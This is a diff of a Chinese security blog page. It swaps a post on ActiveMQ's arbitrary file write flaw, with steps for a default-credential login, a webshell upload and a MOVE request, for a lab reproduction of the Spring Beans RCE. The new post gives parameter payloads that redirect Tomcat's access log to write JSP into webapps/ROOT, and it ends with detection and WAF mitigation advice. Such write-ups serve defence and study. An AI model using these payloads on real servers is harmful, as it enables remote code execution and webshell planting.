@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="zh-cn">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='go!'><title>Activemq 任意文件写入漏洞</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='go!'><title>Spring Beans RCE 复现</title>
 
-<link rel='canonical' href='https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-2/'>
+<link rel='canonical' href='https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-4/'>
 
-<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='Activemq 任意文件写入漏洞'>
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='Spring Beans RCE 复现'>
 <meta property='og:description' content='go!'>
-<meta property='og:url' content='https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-2/'>
+<meta property='og:url' content='https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-4/'>
 <meta property='og:site_name' content='cOOl &#39;s blog'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2021-11-02T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2021-11-02T00:00:00&#43;00:00'/><meta property='og:image' content='https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-2/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg' />
-<meta name="twitter:title" content="Activemq 任意文件写入漏洞">
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2022-04-04T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-04-04T00:00:00&#43;00:00'/><meta property='og:image' content='https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-4/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg' />
+<meta name="twitter:title" content="Spring Beans RCE 复现">
 <meta name="twitter:description" content="go!"><meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:image" content='https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-2/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg' />
+    <meta name="twitter:image" content='https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-4/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg' />
     </head>
     <body class="
     article-page has-toc
@@ -62,13 +62,13 @@
     <article class="has-image main-article">
     <header class="article-header">
         <div class="article-image">
-            <a href="/p/%E5%A4%8D%E7%8E%B0-2/">
-                <img src="/p/%E5%A4%8D%E7%8E%B0-2/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_800x0_resize_q75_box.jpg"
-                        srcset="/p/%E5%A4%8D%E7%8E%B0-2/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_800x0_resize_q75_box.jpg 800w, /p/%E5%A4%8D%E7%8E%B0-2/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_1600x0_resize_q75_box.jpg 1600w"
+            <a href="/p/%E5%A4%8D%E7%8E%B0-4/">
+                <img src="/p/%E5%A4%8D%E7%8E%B0-4/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_800x0_resize_q75_box.jpg"
+                        srcset="/p/%E5%A4%8D%E7%8E%B0-4/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_800x0_resize_q75_box.jpg 800w, /p/%E5%A4%8D%E7%8E%B0-4/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_1600x0_resize_q75_box.jpg 1600w"
                         width="800" 
                         height="534" 
                         loading="lazy"
-                        alt="Featured image of post Activemq 任意文件写入漏洞" />
+                        alt="Featured image of post Spring Beans RCE 复现" />
                 
             </a>
         </div>
@@ -86,7 +86,7 @@
     
 
     <h2 class="article-title">
-        <a href="/p/%E5%A4%8D%E7%8E%B0-2/">Activemq 任意文件写入漏洞</a>
+        <a href="/p/%E5%A4%8D%E7%8E%B0-4/">Spring Beans RCE 复现</a>
     </h2>
 
     
@@ -108,7 +108,7 @@
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
 </svg>
-                <time class="article-time--published">Nov 02, 2021</time>
+                <time class="article-time--published">Apr 04, 2022</time>
             </div>
         
 
@@ -123,7 +123,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 2 分钟
+                    阅读时长: 3 分钟
                 </time>
             </div>
         
@@ -133,155 +133,186 @@
 </header>
 
     <section class="article-content">
-    <h1 id="activemq-任意文件写入漏洞">Activemq 任意文件写入漏洞</h1>
-<h2 id="简介">简介</h2>
-<p>ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，<strong>fileserver无需登录。</strong></p>
-<p>fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但后来发现：其使用率并不高，并且文件操作容易出现漏洞。</p>
-<p>所以，<strong>ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用</strong>（可以在conf/jetty.xml中开启）；<strong>在5.14.0版本以后，彻底删除了fileserver应用。</strong></p>
-<h2 id="漏洞详情">漏洞详情</h2>
-<p><strong>漏洞编号：</strong></p>
-<p>CVE-2016-3088</p>
-<p>本漏洞出现在fileserver应用中，本质就是fileserver支持写入文件（但不解析jsp），同时支持移动文件（MOVE请求）。</p>
-<p>一般利用方式为写入一个文件，然后使用MOVE请求将其移动到任意位置，造成任意文件写入漏洞。</p>
-<h2 id="利用">利用</h2>
-<p>尝试写webshell，但是默认是不进行解析，所以如果有弱口令直接登录admin或api，将文件移动到可解析目录即可。</p>
+    <h1 id="spring-beans-rce-复现">Spring Beans RCE 复现</h1>
+<h2 id="影响范围">影响范围</h2>
 <ul>
-<li>访问8161端口</li>
+<li>JDK &gt;= 9</li>
+<li>使用了 Spring 框架及其衍生框架<code>spring-beans-*.jar</code>文件或存在<code>CachedIntrospectionResults.class</code></li>
 </ul>
-<p><figure 
-	
-		class="gallery-image" 
-		style="
-			flex-grow: 235; 
-			flex-basis: 565px"
-	>
-	<a href="/p/%E5%A4%8D%E7%8E%B0-2/image-20220308153554881.png" data-size="1195x507">
-		<img src="/p/%E5%A4%8D%E7%8E%B0-2/image-20220308153554881.png"
-			width="1195"
-			height="507"
-			srcset="/p/%E5%A4%8D%E7%8E%B0-2/image-20220308153554881_huddc314303b8ed84e32c3faf677f7db70_74790_480x0_resize_box_3.png 480w, /p/%E5%A4%8D%E7%8E%B0-2/image-20220308153554881_huddc314303b8ed84e32c3faf677f7db70_74790_1024x0_resize_box_3.png 1024w"
-			loading="lazy"
-			>
-	</a>
-	
-</figure></p>
+<h2 id="漏洞介绍">漏洞介绍</h2>
+<p>Spring MVC 框架的参数绑定功能支持将请求中的参数绑定到控制器方法中参数对象的成员变量，本质上就是参数绑定引发的变量覆盖漏洞。公开的利用链是通过求获取 AccessLogValve 对象并注入恶意字段值，从而触发 pipeline 机制实现任意路径下写文件。</p>
+<h2 id="漏洞复现">漏洞复现</h2>
+<h3 id="环境">环境</h3>
+<p>docker 镜像：</p>
+<pre tabindex="0"><code>docker pull vulfocus/spring-core-rce-2022-03-29:latest
+docker run -d -p 8080:8080 --name spring-core-rce vulfocus/spring-core-rce-2022-03-29
+</code></pre><h3 id="原理及利用">原理及利用</h3>
+<p>本质就是变量覆盖修改 tomcat 的 log 配置，实现在<code>webapp/path</code>下写入 jsp，实现命令执行。</p>
 <ul>
-<li>访问admin目录，尝试默认口令：admin:admin</li>
+<li>发送请求修改tomcat 日志文件名 和 路径</li>
 </ul>
+<pre tabindex="0"><code># 设置文件后缀为 .jsp
+class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
+
+# 设置文件前缀为 shell
+class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell
+
+# 设置日志文件的路径为 webapps/path，只有该文件下的 jsp 文件会被解析
+class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
+</code></pre><ul>
+<li>发送请求设置 log 的<code>pattern</code> 和 <code>fileDateFormat</code>，其中 pattern 具有固定格式，根据官方定义，pattern 的值可以是<code>common</code> 和 <code>combined</code></li>
+</ul>
+<pre tabindex="0"><code># common 的定义
+
+%a - Remote IP address. See also %{xxx}a below.
+%A - Local IP address
+%b - Bytes sent, excluding HTTP headers, or '-' if zero
+%B - Bytes sent, excluding HTTP headers
+%h - Remote host name (or IP address if enableLookups for the connector is false)
+%H - Request protocol
+%l - Remote logical username from identd (always returns '-')
+%m - Request method (GET, POST, etc.)
+%p - Local port on which this request was received. See also %{xxx}p below.
+%q - Query string (prepended with a '?' if it exists)
+%r - First line of the request (method and request URI)
+%s - HTTP status code of the response
+%S - User session ID
+%t - Date and time, in Common Log Format
+%u - Remote user that was authenticated (if any), else '-' (escaped if required)
+%U - Requested URL path
+%v - Local server name
+%D - Time taken to process the request in millis. Note: In httpd %D is microseconds. Behaviour will be aligned to httpd in Tomcat 10 onwards.
+%T - Time taken to process the request, in seconds. Note: This value has millisecond resolution whereas in httpd it has second resolution. Behaviour will be align to httpd in Tomcat 10 onwards.
+%F - Time taken to commit the response, in milliseconds
+%I - Current request thread name (can compare later with stacktraces)
+</code></pre><pre tabindex="0"><code># combined 定义
+
+%{xxx}a write remote address (client) (xxx==remote) or connection peer address (xxx=peer)
+
+%{xxx}i write value of incoming header with name xxx (escaped if required)
+
+%{xxx}o write value of outgoing header with name xxx (escaped if required)
+
+%{xxx}c write value of cookie with name xxx (escaped if required)
+
+%{xxx}r write value of ServletRequest attribute with name xxx (escaped if required)
+
+%{xxx}s write value of HttpSession attribute with name xxx (escaped if required)
+
+%{xxx}p write local (server) port (xxx==local) or remote (client) port (xxx=remote)
+
+%{xxx}t write timestamp at the end of the request formatted using the enhanced SimpleDateFormat pattern xxx
+</code></pre><p>本来是可以直接在 <code>pattern</code>中直接写入 payload，例如：</p>
+<pre tabindex="0"><code>class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=666
+class.module.classLoader.resources.context.parent.pipeline.first.pattern=%3C%25out.println(123);%25%3E
+</code></pre><p>结果出现错误，主要是因为写入的字符中包含<code>%</code>字符，该字符在日志配置中有特殊作用，因此报错如下：</p>
 <p><figure 
 	
 		class="gallery-image" 
 		style="
-			flex-grow: 127; 
-			flex-basis: 307px"
+			flex-grow: 687; 
+			flex-basis: 1649px"
 	>
-	<a href="/p/%E5%A4%8D%E7%8E%B0-2/image-20220308153640934.png" data-size="481x376">
-		<img src="/p/%E5%A4%8D%E7%8E%B0-2/image-20220308153640934.png"
-			width="481"
-			height="376"
-			srcset="/p/%E5%A4%8D%E7%8E%B0-2/image-20220308153640934_hud222dc27c3c0e5950c05dce7f8905ce1_13338_480x0_resize_box_3.png 480w, /p/%E5%A4%8D%E7%8E%B0-2/image-20220308153640934_hud222dc27c3c0e5950c05dce7f8905ce1_13338_1024x0_resize_box_3.png 1024w"
+	<a href="/p/%E5%A4%8D%E7%8E%B0-4/image-20220404110130146.png" data-size="598x87">
+		<img src="/p/%E5%A4%8D%E7%8E%B0-4/image-20220404110130146.png"
+			width="598"
+			height="87"
+			srcset="/p/%E5%A4%8D%E7%8E%B0-4/image-20220404110130146_hu2e2f08fc3dbdfd9c1bfee9e8adc44420_20251_480x0_resize_box_3.png 480w, /p/%E5%A4%8D%E7%8E%B0-4/image-20220404110130146_hu2e2f08fc3dbdfd9c1bfee9e8adc44420_20251_1024x0_resize_box_3.png 1024w"
 			loading="lazy"
 			>
 	</a>
 	
 </figure></p>
-<p><figure 
+<p>所以尝试用<code>combined</code>中的一些定义尝试写入 webshell，避免<code>%</code>的直接写入：</p>
+<pre tabindex="0"><code># 法一：根据定义使用 `%{xxx}i` 从 HTTP Header 去读取值并写入
+
+class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=666
+
+GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bcmd%7Di HTTP/1.1
+Host: IP:PORT
+cmd: &lt;%out.println(123);%&gt;
+</code></pre><p><figure 
 	
 		class="gallery-image" 
 		style="
-			flex-grow: 183; 
-			flex-basis: 441px"
+			flex-grow: 652; 
+			flex-basis: 1565px"
 	>
-	<a href="/p/%E5%A4%8D%E7%8E%B0-2/image-20220308153822513.png" data-size="1205x655">
-		<img src="/p/%E5%A4%8D%E7%8E%B0-2/image-20220308153822513.png"
-			width="1205"
-			height="655"
-			srcset="/p/%E5%A4%8D%E7%8E%B0-2/image-20220308153822513_hufc60c43cb17945b42cebef919bcb6ba0_73649_480x0_resize_box_3.png 480w, /p/%E5%A4%8D%E7%8E%B0-2/image-20220308153822513_hufc60c43cb17945b42cebef919bcb6ba0_73649_1024x0_resize_box_3.png 1024w"
+	<a href="/p/%E5%A4%8D%E7%8E%B0-4/image-20220404111544227.png" data-size="600x92">
+		<img src="/p/%E5%A4%8D%E7%8E%B0-4/image-20220404111544227.png"
+			width="600"
+			height="92"
+			srcset="/p/%E5%A4%8D%E7%8E%B0-4/image-20220404111544227_hua4dcec7267d62fbe696774a95f968f4b_20741_480x0_resize_box_3.png 480w, /p/%E5%A4%8D%E7%8E%B0-4/image-20220404111544227_hua4dcec7267d62fbe696774a95f968f4b_20741_1024x0_resize_box_3.png 1024w"
 			loading="lazy"
 			>
 	</a>
 	
 </figure></p>
+<p><strong>法一存在缺陷，无法写入<code>&quot;</code>，存在转义：</strong></p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 960; 
+			flex-basis: 2305px"
+	>
+	<a href="/p/%E5%A4%8D%E7%8E%B0-4/image-20220404111817729.png" data-size="365x38">
+		<img src="/p/%E5%A4%8D%E7%8E%B0-4/image-20220404111817729.png"
+			width="365"
+			height="38"
+			srcset="/p/%E5%A4%8D%E7%8E%B0-4/image-20220404111817729_hu932f94cb42644f9c986cabfd86d07389_6358_480x0_resize_box_3.png 480w, /p/%E5%A4%8D%E7%8E%B0-4/image-20220404111817729_hu932f94cb42644f9c986cabfd86d07389_6358_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<pre tabindex="0"><code># 法二：根据定义使用 `%{xxx}t` 直接写入以 simpleDateFormat 格式定义的 timestamp，这个 timestamp 是可以包含 `%` 和 `&quot;` 字符
+
+class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=888
+
+GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%3C%25%7B%25%7Dtout.println(%22mytest%22);%25%7B%25%7Dt%3E HTTP/1.1
+Host: IP:PORT
+</code></pre><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 677; 
+			flex-basis: 1625px"
+	>
+	<a href="/p/%E5%A4%8D%E7%8E%B0-4/image-20220404112756751.png" data-size="596x88">
+		<img src="/p/%E5%A4%8D%E7%8E%B0-4/image-20220404112756751.png"
+			width="596"
+			height="88"
+			srcset="/p/%E5%A4%8D%E7%8E%B0-4/image-20220404112756751_hu86292364a750163b8317ef225ca676bb_16104_480x0_resize_box_3.png 480w, /p/%E5%A4%8D%E7%8E%B0-4/image-20220404112756751_hu86292364a750163b8317ef225ca676bb_16104_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<h2 id="排查与修复">排查与修复</h2>
 <ul>
-<li>访问<code>admin/test/systemProperties.jsp</code>目录查看信息</li>
-</ul>
-<p><figure 
-	
-		class="gallery-image" 
-		style="
-			flex-grow: 166; 
-			flex-basis: 399px"
-	>
-	<a href="/p/%E5%A4%8D%E7%8E%B0-2/image-20220308154242905.png" data-size="1534x921">
-		<img src="/p/%E5%A4%8D%E7%8E%B0-2/image-20220308154242905.png"
-			width="1534"
-			height="921"
-			srcset="/p/%E5%A4%8D%E7%8E%B0-2/image-20220308154242905_hu4a3258ea4dac9e176d8122abb7e54dce_150870_480x0_resize_box_3.png 480w, /p/%E5%A4%8D%E7%8E%B0-2/image-20220308154242905_hu4a3258ea4dac9e176d8122abb7e54dce_150870_1024x0_resize_box_3.png 1024w"
-			loading="lazy"
-			>
-	</a>
-	
-</figure></p>
+<li>
+<p>排查</p>
 <ul>
-<li>使用fileserver上传webshell</li>
+<li>jdk 版本</li>
+<li>不论是 war 包还是 jar 包，解压后排查<code>spring-beans-*.jar</code>格式的文件、排查<code>CachedIntrospectionResuLts.class</code>文件</li>
 </ul>
-<p><figure 
-	
-		class="gallery-image" 
-		style="
-			flex-grow: 265; 
-			flex-basis: 638px"
-	>
-	<a href="/p/%E5%A4%8D%E7%8E%B0-2/image-20220308155623008.png" data-size="1532x576">
-		<img src="/p/%E5%A4%8D%E7%8E%B0-2/image-20220308155623008.png"
-			width="1532"
-			height="576"
-			srcset="/p/%E5%A4%8D%E7%8E%B0-2/image-20220308155623008_hufea9f3361adfb1b496d99dc49d87c9d8_132109_480x0_resize_box_3.png 480w, /p/%E5%A4%8D%E7%8E%B0-2/image-20220308155623008_hufea9f3361adfb1b496d99dc49d87c9d8_132109_1024x0_resize_box_3.png 1024w"
-			loading="lazy"
-			>
-	</a>
-	
-</figure></p>
+</li>
+<li>
+<p>临时修复</p>
 <ul>
-<li>使用MOVE方法移动到可解析的目录</li>
+<li>
+<p>依靠 WAF 规则中对参数中所有出现的 <code>class.*</code>， <code>Class.*</code>，<code>*.class.*</code>， <code>*.Class.*</code> 字符串过滤</p>
+</li>
+<li>
+<p>在应用中全局搜索<code>@InitBinder</code>注解，看看方法体内是否调用<code>dataBinder.setDisallowedFields</code>方法，如果发现此代码片段的引入，则在原来的黑名单中，添加<code>{&quot;class.&quot;,&quot;Class.&quot;,&quot;.class.&quot;, &quot;.Class.&quot;}</code></p>
+<blockquote>
+<p>如果此代码片段使用较多,需要每个地方都追加</p>
+</blockquote>
+</li>
 </ul>
-<p><figure 
-	
-		class="gallery-image" 
-		style="
-			flex-grow: 412; 
-			flex-basis: 988px"
-	>
-	<a href="/p/%E5%A4%8D%E7%8E%B0-2/image-20220308162214657.png" data-size="1438x349">
-		<img src="/p/%E5%A4%8D%E7%8E%B0-2/image-20220308162214657.png"
-			width="1438"
-			height="349"
-			srcset="/p/%E5%A4%8D%E7%8E%B0-2/image-20220308162214657_hudf771f77e506b353c7061affd915bd33_102217_480x0_resize_box_3.png 480w, /p/%E5%A4%8D%E7%8E%B0-2/image-20220308162214657_hudf771f77e506b353c7061affd915bd33_102217_1024x0_resize_box_3.png 1024w"
-			loading="lazy"
-			>
-	</a>
-	
-</figure></p>
-<ul>
-<li>访问webshell，此时涉及到登录，添加HTTP basic Authorization头，蚁剑连接</li>
+</li>
 </ul>
-<p><figure 
-	
-		class="gallery-image" 
-		style="
-			flex-grow: 557; 
-			flex-basis: 1338px"
-	>
-	<a href="/p/%E5%A4%8D%E7%8E%B0-2/image-20220308162456701.png" data-size="1483x266">
-		<img src="/p/%E5%A4%8D%E7%8E%B0-2/image-20220308162456701.png"
-			width="1483"
-			height="266"
-			srcset="/p/%E5%A4%8D%E7%8E%B0-2/image-20220308162456701_hu533ea7edd156051fabb7eaba9a10d440_63568_480x0_resize_box_3.png 480w, /p/%E5%A4%8D%E7%8E%B0-2/image-20220308162456701_hu533ea7edd156051fabb7eaba9a10d440_63568_1024x0_resize_box_3.png 1024w"
-			loading="lazy"
-			>
-	</a>
-	
-</figure></p>
 
 </section>
 
@@ -316,29 +347,6 @@
                 
                     
 <article class="has-image">
-    <a href="/p/%E5%A4%8D%E7%8E%B0-4/">
-        
-        
-            <div class="article-image">
-                <img src="/p/%E5%A4%8D%E7%8E%B0-4/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
-                        width="250" 
-                        height="150" 
-                        loading="lazy"
-                        alt="Featured image of post Spring Beans RCE 复现"
-                        data-key="复现-4" 
-                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">Spring Beans RCE 复现</h2>
-        </div>
-    </a>
-</article>
-                
-                    
-<article class="has-image">
     <a href="/p/%E5%A4%8D%E7%8E%B0-1/">
         
         
@@ -356,6 +364,29 @@
 
         <div class="article-details">
             <h2 class="article-title">pkexec 本地提权</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/%E5%A4%8D%E7%8E%B0-2/">
+        
+        
+            <div class="article-image">
+                <img src="/p/%E5%A4%8D%E7%8E%B0-2/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Activemq 任意文件写入漏洞"
+                        data-key="复现-2" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Activemq 任意文件写入漏洞</h2>
         </div>
     </a>
 </article>
@@ -508,9 +539,15 @@
                 <div class="widget--toc">
                     <nav id="TableOfContents">
   <ol>
-    <li><a href="#简介">简介</a></li>
-    <li><a href="#漏洞详情">漏洞详情</a></li>
-    <li><a href="#利用">利用</a></li>
+    <li><a href="#影响范围">影响范围</a></li>
+    <li><a href="#漏洞介绍">漏洞介绍</a></li>
+    <li><a href="#漏洞复现">漏洞复现</a>
+      <ol>
+        <li><a href="#环境">环境</a></li>
+        <li><a href="#原理及利用">原理及利用</a></li>
+      </ol>
+    </li>
+    <li><a href="#排查与修复">排查与修复</a></li>
   </ol>
 </nav>
                 </div>
